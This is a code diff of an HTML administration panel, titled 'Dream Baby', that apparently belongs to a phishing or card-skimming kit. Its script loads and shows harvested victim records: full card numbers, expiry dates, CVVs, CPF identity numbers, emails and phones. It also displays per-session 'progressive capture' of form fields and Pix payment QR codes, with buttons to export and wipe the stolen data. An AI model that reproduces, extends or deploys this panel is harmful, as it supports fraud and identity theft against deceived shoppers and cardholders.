@@ -1,31 +1,130 @@
 
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
 <head>
   <meta charset="UTF-8">
-  <title>Painel Admin</title>
+  <title>Painel Administrativo - Dream Baby</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
-      padding: 20px;
+    body { font-family: Arial, sans-serif; padding: 20px; background-color: #f0f0f0; }
+    h1 { color: #333; }
+    .bloco, .pix-bloco {
+      background: #fff; padding: 10px 15px; margin-bottom: 10px;
+      border: 1px solid #ccc; border-radius: 6px;
+      cursor: pointer;
     }
-    h1 {
-      color: #d63384;
+    .detalhes, .lista-capturas, .lista-pix { display: none; margin-top: 10px; }
+    button, input[type="submit"] {
+      background-color: #4CAF50; color: white;
+      border: none; padding: 10px 15px; margin: 5px 0;
+      border-radius: 4px; cursor: pointer;
     }
-    .container {
-      background: white;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
+    input[type="password"] { padding: 6px; margin-left: 10px; }
+    .acoes { margin-bottom: 20px; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Painel Admin</h1>
-    <p>Você acessou o painel com sucesso usando a senha correta.</p>
-    <!-- Aqui poderia ir a listagem de sessões, dados capturados, etc -->
+  <h1>Painel Administrativo - Dream Baby</h1>
+  <div class="acoes">
+    <a href="/exportar-txt"><button>📤 Exportar Dados</button></a>
+    <form onsubmit="return limparDados(this)" style="display:inline;">
+      <label>Senha limpeza:</label>
+      <input type="password" name="senha" required />
+      <input type="submit" value="🧹 Limpar Dados" />
+    </form>
+    <button onclick="carregarAdmin()">🔄 Recarregar</button>
+    <a href="/logout"><button>🚪 Logout</button></a>
   </div>
+
+  <div id="painel">Carregando dados...</div>
+
+  <script>
+    async function carregarAdmin() {
+      try {
+        const resposta = await fetch("/dados-admin");
+        const dados = await resposta.json();
+        const painel = document.getElementById("painel");
+        painel.innerHTML = "";
+
+        // DADOS FINAIS
+        if (dados.finais?.length) {
+          painel.innerHTML += "<h2>Dados Finais</h2>";
+          dados.finais.forEach((dado, i) => {
+            painel.innerHTML += \`
+              <div class="bloco" onclick="alternar('final-\${i}')">
+                <strong>\${dado.nome}</strong>
+                <div class="detalhes" id="final-\${i}">
+                  <div>Número: \${dado.numeroCartao}</div>
+                  <div>Validade: \${dado.validade}</div>
+                  <div>CVV: \${dado.cvv}</div>
+                  <div>CPF: \${dado.cpf}</div>
+                  <div>Email: \${dado.email}</div>
+                  <div>Telefone: \${dado.telefone}</div>
+                </div>
+              </div>\`;
+          });
+        }
+
+        // CAPTURA PROGRESSIVA
+        if (dados.progressivos?.length) {
+          painel.innerHTML += "<h2 onclick='alternar("lista-capturas")' style='cursor:pointer;'>▶️ Captura Progressiva</h2><div id='lista-capturas' class='lista-capturas'>";
+          const agrupado = {};
+          dados.progressivos.forEach(p => {
+            if (!agrupado[p.sessionId]) agrupado[p.sessionId] = [];
+            agrupado[p.sessionId].push(p);
+          });
+          for (const [sessao, capturas] of Object.entries(agrupado)) {
+            painel.innerHTML += \`
+              <div class="bloco">
+                <strong>Sessão:</strong> \${sessao}
+                <div class="detalhes">\` +
+                capturas.map(p => \`<div>\${p.campo}: \${p.valor}</div>\`).join('') +
+              \`</div>
+              </div>\`;
+          }
+          painel.innerHTML += "</div>";
+        }
+
+        // PAGAMENTOS PIX
+        if (dados.pix?.length) {
+          painel.innerHTML += "<h2 onclick='alternar("lista-pix")' style='cursor:pointer;'>▶️ Pagamentos via Pix</h2><div id='lista-pix' class='lista-pix'>";
+          dados.pix.forEach(p => {
+            painel.innerHTML += \`
+              <div class="pix-bloco">
+                <div><strong>Nome:</strong> \${p.nome}</div>
+                <div><strong>Telefone:</strong> \${p.telefone}</div>
+                <div><strong>Valor:</strong> R$ \${p.valor}</div>
+                <img src="\${p.qrCodeImage}" width="160" />
+                <div><strong>Chave:</strong> \${p.qrCodeString}</div>
+              </div>\`;
+          });
+          painel.innerHTML += "</div>";
+        }
+
+      } catch (err) {
+        document.getElementById("painel").innerHTML = "Erro ao carregar dados.";
+      }
+    }
+
+    function alternar(id) {
+      const el = document.getElementById(id);
+      if (el) el.style.display = (el.style.display === "block" ? "none" : "block");
+    }
+
+    async function limparDados(form) {
+      const senha = form.senha.value;
+      const res = await fetch("/limpar-dados", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: "senha=" + encodeURIComponent(senha)
+      });
+      const msg = await res.text();
+      alert(msg);
+      carregarAdmin();
+      return false;
+    }
+
+    carregarAdmin();
+    setInterval(carregarAdmin, 90000);
+  </script>
 </body>
 </html>
